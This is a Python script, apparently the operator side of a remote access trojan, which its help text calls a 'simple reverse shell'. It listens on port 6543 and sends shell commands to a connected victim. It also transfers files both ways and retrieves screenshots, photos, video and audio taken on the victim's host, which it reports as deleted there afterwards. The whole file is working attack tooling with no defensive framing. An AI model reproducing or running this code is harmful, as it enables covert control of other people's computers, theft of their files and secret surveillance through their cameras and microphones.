import socket
import os
from termcolor import colored


BUFFER_SIZE = 1024*128
BUFFER_SIZE1: int = 4096

HOST = '0.0.0.0'
PORT = 6543

def helpp():
    print("Hello, this is simple reverse shell\n"
          "Available commands:\n"
          "- CLI of host OS"
          "- download/upload - downloading or uploading files\n"
          "- screenshot/photo/video - takes s/p/v from host, download and delete on host\n"
          "- exit - to exit server and client\n"
          "- help - to see this instructions")

def download(conn, filename):
    print('[*]Download::', filename)
    existing, filesize = conn.recv(BUFFER_SIZE).decode().split('<kitty>')
    print(existing)
    if existing == "exist":
        print('[*]Filesize::', filesize)
        conn.send('ok'.encode())
        f = open(filename, "wb")
        print('[*]Open file :: ', filename)
        while 1:
            print('[*]Downloading...')
            data = conn.recv(BUFFER_SIZE1)
            try:
                if data.decode() == 'end':
                    print('[*]End of downloading::', filename)
                    break
            except:
                pass
            f.write(data)
            print('[*]Writting in::', filename)
    else:
        print(colored('Cannot find the file', 'red'))

def upload(conn, filename):
    if os.path.isfile(filename):
        filesize = os.path.getsize(filename)
        print('[*]Filesize::', filesize)
        f = open(filename, "rb")
        while 1:
            print('[*]Uploading...')
            bytes_read = f.read(BUFFER_SIZE1)
            if not bytes_read:
                print('[*]End of uploading::', filename)
                conn.send('end'.encode())
                break
            conn.sendall(bytes_read)
    else:
        print(colored('Cannot find the file', 'red'))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
print('[*]Connecting...')
s.listen()
client_socket, addr = s.accept()
print('[*]Connected', addr)
data = client_socket.recv(BUFFER_SIZE).decode()
client_os, directory = data.split('<kitty>')
print('[*]You are connected to', client_os, 'os')
while True:
    com = input(f"{directory}$>")
    if com == '':
        continue

    client_socket.send(com.encode())
    if com == 'exit':
        break

    temp = com.split(' ', 1)
    if temp[0] == 'download':
        download(client_socket, temp[1])
        continue

    if temp[0] == 'upload':
        upload(client_socket, temp[1])
        continue

    if temp[0] == 'screenshot' or temp[0] == 'photo' or temp[0] == 'video' or temp[0] == 'audio':
        filename = client_socket.recv(BUFFER_SIZE).decode()
        print(f"[*]{temp[0]} was taken, try to download...")
        download(client_socket, filename)
        print(f"[*]{temp[0]} was deleted from host")
        continue

    if temp[0] == 'help':
        helpp()
        continue

    if temp[0] == 'screenshot' or temp[0] == 'photo' or temp[0] == 'video' or temp[0] == 'audio':
        filename = client_socket.recv(BUFFER_SIZE).decode()
        print(f"[*]{temp[0]} was taken, try to download...")
        download(client_socket, filename)
        print(f"[*]{temp[0]} was deleted from host")
        continue


    data = client_socket.recv(BUFFER_SIZE).decode()
    data, directory = data.split('<kitty>')
    print(data)


client_socket.close()
s.close()
